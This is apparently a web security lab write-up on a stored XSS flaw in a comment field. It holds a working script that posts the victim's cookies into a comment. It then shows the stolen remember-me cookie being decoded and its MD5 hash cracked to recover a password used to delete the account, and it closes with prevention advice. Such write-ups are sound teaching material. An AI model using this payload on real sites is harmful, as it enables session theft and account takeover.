Vulnerability:
	The server does not sanitize \ filter the value of the comment input, allowing an attackerto perform Stored XSS.
	Also, the password is stored in the cookie header, allowing the attacker to put his hands over the password.
	
Exploit:
	- Write a JS code that will get the cookie values, and send a POST request to the server including those values in the comment variable.
	- Get the "stay-logged-in" parameter's value and get the password from it.
	
Example:
	The JS code to be uploaded to the server:
	<script>
	window.onload = function() {
		const data = new URLSearchParams();
		data.append('postId', '10');
		data.append('comment', document.cookie);
		data.append('name', 'Victim');
		data.append('email', 'carlos@gmail.com');
		data.append('website', 'https://nothing.com');

		fetch('/post/comment', {
			method: 'POST',
			headers: {
			    'Content-Type': 'application/x-www-form-urlencoded'
			},
			body: data
		});
	};
	</script>
	
	Then, once the user is entered the page, this script will run.
	Explenation:
		- Wait until fully loaded.
		- Will build the body of the request, and put the cookies values in the "comment" parameter.
		- Using fetch, it will send the POST request to the server including the sensetive data in the comment.
	
	Then, the password is neede dto be extracted from the "stay-logged-in" value, Those steppes were taken:
		- Value of stay-logged-in: "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz"
		- Base64 decode "stay-logged-in": "carlos:26323c16d5f4dabff3bb136f2460a943"
		- MD5 Dycript of "26323c16d5f4dabff3bb136f2460a943": "onceuponatime"
		- Password = onceuponatime
	
	Use the password to delete carlos's account.  
	
Prevention:
	For the Stored XSS:
		- Sanitize the input data.
		- Perform HTML entity encodings like:
			< → &lt;
			> → &gt;
			& → &amp;
			" → &quot;
	
	For the Authentication:
		- Generate a random string or use the sessionID as the "stay-logged-on" value in stead of using predectable values \ password of the user.
	
	
